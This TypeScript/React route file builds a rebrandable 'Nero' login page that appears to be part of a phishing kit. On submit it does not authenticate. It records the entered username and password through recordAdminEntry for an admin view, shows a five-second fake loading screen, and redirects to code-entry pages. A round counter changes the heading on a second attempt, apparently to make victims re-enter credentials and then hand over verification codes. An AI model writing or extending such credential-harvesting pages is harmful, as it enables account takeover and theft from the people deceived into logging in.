import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { NeroCard, NeroShell, NeroWordmark } from "@/components/nero/Shell";
import { PrimaryButton } from "@/components/nero/PrimaryButton";
import { LoadingOverlay } from "@/components/nero/LoadingOverlay";
import { getRound, recordAdminEntry } from "@/lib/nero-flow";
import { getSiteData } from "@/lib/cms.functions";

export const Route = createFileRoute("/new")({
  loader: () => getSiteData(),
  head: ({ loaderData }) => {
    const c = loaderData?.content.login;
    const title = c?.seoTitle ?? "Log in to Nero";
    const description = c?.seoDescription ?? "Log in to Nero.";
    return {
      meta: [
        { title },
        { name: "description", content: description },
        { property: "og:title", content: title },
        { property: "og:description", content: description },
      ],
    };
  },
  component: LoginPage,
});

function LoginPage() {
  const { brand, content } = Route.useLoaderData();
  const c = content.login;
  const navigate = useNavigate();
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const round = getRound();

  const heading = round > 1 ? c.headingRound2 : c.headingRound1;
  const valid = identifier.trim().length > 3 && password.length >= 6;

  return (
    <NeroShell brand={brand}>
      {loading && <LoadingOverlay label={c.loadingLabel} />}
      <div className="pt-6 pb-8">
        <NeroWordmark text={brand.wordmark} />
        <p className="mt-3 text-center text-[14px] text-muted-foreground">{heading}</p>
      </div>

      <NeroCard>
        <form
          className="space-y-3"
          onSubmit={(e) => {
            e.preventDefault();
            if (!valid) {
              setError(c.validationError);
              return;
            }
            setError(null);
            setLoading(true);
            recordAdminEntry({ kind: "login", identifier, password });
            const target = round > 1 ? "/code-1b" : "/code-1";
            window.setTimeout(() => navigate({ to: target }), 5000);
          }}
        >
          <input
            aria-label="Email address or phone number"
            placeholder={c.identifierPlaceholder}
            autoComplete="username"
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
            className="h-12 w-full rounded-md border border-input bg-card px-4 text-[16px] text-card-foreground placeholder:text-muted-foreground focus:border-ring focus:ring-2 focus:ring-ring/30 focus:outline-none"
          />
          <input
            aria-label="Password"
            type="password"
            placeholder={c.passwordPlaceholder}
            autoComplete="current-password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="h-12 w-full rounded-md border border-input bg-card px-4 text-[16px] text-card-foreground placeholder:text-muted-foreground focus:border-ring focus:ring-2 focus:ring-ring/30 focus:outline-none"
          />
          {error && <p className="text-[13px] text-destructive">{error}</p>}
          <PrimaryButton type="submit">{c.submitLabel}</PrimaryButton>
        </form>

        <p className="mt-4 text-center text-[14px] font-medium text-brand-link">{c.forgotLabel}</p>
      </NeroCard>

      <p className="mt-6 text-center text-[13px] text-muted-foreground">{c.footer}</p>
    </NeroShell>
  );
}
